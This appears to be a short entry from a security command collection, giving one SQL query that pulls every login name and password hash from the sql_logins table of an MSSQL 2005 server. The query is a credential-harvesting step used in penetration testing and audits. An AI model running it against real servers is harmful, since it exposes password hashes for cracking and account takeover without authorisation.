---
id: 2014d6c1-5914-4e2e-872d-cf2c125eb248
name: Retrieve name and hashed password from sql_logins table in MSSQL 2005
type: command
executor: bash
data: SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
output: null
created_at: '2023-04-06T03:56:21.128505+00:00'
updated_at: '2023-04-10T20:36:43.926869+00:00'
---

# Retrieve name and hashed password from sql_logins table in MSSQL 2005

```bash
SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
```


